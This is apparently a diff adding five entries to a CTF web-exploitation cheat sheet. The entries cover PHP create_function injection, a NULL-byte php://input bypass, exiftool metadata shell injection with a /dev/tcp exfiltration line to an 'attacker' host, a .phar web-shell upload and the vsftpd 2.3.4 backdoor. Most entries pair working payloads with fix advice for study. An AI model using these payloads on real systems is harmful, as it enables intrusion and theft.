@@ -24,6 +24,11 @@
 - [Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)](#jinja2-ssti-via-globals__self__exec-string-concat-bypass-inctf-2018)
 - [web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)](#webpy-reparam-eval--__subclasses__-with-blanked-builtins-hitcon-2018)
 - [Redis Lua Injection via redis.call() (HumanCTF 2018)](#redis-lua-injection-via-rediscall-humanctf-2018)
+- [PHP create_function String Interpolation RCE (FireShell 2019)](#php-create_function-string-interpolation-rce-fireshell-2019)
+- [php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)](#phpinput--null-byte--bitwise-base64-filter-bypass-defcamp-2018)
+- [EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)](#exif-imagedescription-shell-injection-via-exiftool-otw-advent-2018)
+- [.phar Extension Bypass for PHP Upload Blacklists (35C3 2018)](#phar-extension-bypass-for-php-upload-blacklists-35c3-2018)
+- [vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)](#vsftpd-234-smiley-face-backdoor-pwn-ctf-2018)
 
 For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
@@ -708,6 +713,86 @@ print(r.text)
 **Key insight:** Redis Lua scripts expose `redis.call()` and `redis.pcall()` — they are the intended Redis bridge inside Lua, so a blocklist of Redis commands in the HTTP layer is useless once any Lua injection lands. Always pass untrusted values through `KEYS[...]` / `ARGV[...]`, never concatenate them into the script body. When Lua is unavoidable, sandbox the script with `redis-cli SCRIPT LOAD` + signed SHA1 and refuse scripts the client did not precompile.
 
 **References:** HumanCTF / HackOver 2018 — No vuln, trust me, writeup 11816
+
+---
+
+## PHP create_function String Interpolation RCE (FireShell 2019)
+
+**Pattern:** Classic PHP gadget: server calls `create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')` with a user-controlled `$order`. Supply `; system($_GET[c]); return 0; //` to close the `strcmp` prematurely and run arbitrary PHP inside the generated anonymous function.
+
+```text
+order=;system($_GET[c]);return 0;//
+&c=id
+```
+
+**Key insight:** Any PHP function that builds code from a string and hands it to `eval`/`create_function`/`assert` accepts arbitrary PHP with the right semicolon/comment dance. Grep for `create_function` in legacy codebases — it is removed in PHP 8 but still common in CTFs mirroring 2018-era apps.
+
+**References:** FireShell CTF 2019 — Bad injections, writeup 12917
+
+---
+
+## php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)
+
+**Pattern:** `include` endpoint expects a base64-encoded filename. `base64_decode` fails silently on invalid input, but the filename still gets written out as `$name.php`. Inject `name=z.php%00` to NULL-truncate the written filename, then send `data=_`.`~\x9c\x9e\x8b` via POST → `php://input`. PHP's bitwise-NOT operator (`~`) turns non-base64 bytes into ASCII opcodes like `cat`, evading the base64 validator while still landing executable PHP on disk.
+
+```text
+GET: ?name=z.php%00&file=php://input
+POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
+```
+
+Follow up with `GET /z.php?c=cat%20/flag`.
+
+**Key insight:** Write-side filters that only check the URL-encoded name are bypassed by `%00`. Read-side filters that only check base64 alphabet are bypassed by PHP's non-string bitwise operators — they generate the same opcodes without ever matching the filter regex.
+
+**References:** DefCamp CTF Finals 2018 — Scribbles, writeup 12131
+
+---
+
+## EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)
+
+**Pattern:** Server runs `exiftool` on uploaded images and pastes the `-ImageDescription` field into a shell command unquoted. Inject `; command` (or `$(cmd)`) directly into the metadata with an attacker-set exiftool write, then upload.
+
+```bash
+exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
+curl -F upload=@evil.jpg http://target/
+```
+
+**Key insight:** Image upload sinks that parse metadata with `exiftool`, `identify`, or `ffprobe` often pipe the result straight to `exec`/`system`/`sh -c`. Any metadata string field — `ImageDescription`, `Artist`, `Software`, GPS tags — is a shell injection vector. Fix with `escapeshellarg()` or by exporting metadata as JSON and whitelisting field names.
+
+**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12753
+
+---
+
+## .phar Extension Bypass for PHP Upload Blacklists (35C3 2018)
+
+**Pattern:** Apache's PHP handler also matches `.phar` by default, but upload filters frequently only blacklist `.php`, `.phtml`, `.phps`. Rename your shell to `.phar`, append a PHP payload to a valid image, upload — and the Apache handler parses it as PHP. Works through many XSS-protection / image-upload flows.
+
+```http
+POST /upload HTTP/1.1
+filename=shell.phar
+
+[JPEG header] <?php system($_GET["c"]); ?>
+```
+
+**Key insight:** Always enumerate every extension the PHP handler accepts. In default configs that is `.php`, `.phtml`, `.phps`, `.php3`, `.php4`, `.php5`, `.php7`, and `.phar`. Upload blacklists need all of them.
+
+**References:** 35C3 CTF 2018 — express-yourself, writeup 12880
+
+---
+
+## vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)
+
+**Pattern:** vsftpd 2.3.4 shipped with a compromised source release (CVE-2011-2523): any username ending in `:)` triggers a bind shell on TCP port 6200. Detect the vulnerable version via FTP banner or service fingerprint; trigger the backdoor; connect to port 6200 for root shell.
+
+```bash
+ftp target 21
+USER anonymous:)
+nc target 6200
+```
+
+**Key insight:** Supply-chain backdoors live forever. Any FTP server running vsftpd 2.3.4 (version string in the banner) has this. Same class of backdoor hit proftpd-1.3.3c and unreal-ircd-3.2.8.1 — memorise the set.
+
+**References:** P.W.N. CTF 2018 — Very Secure FTP, writeup 12060
 
 ---
 
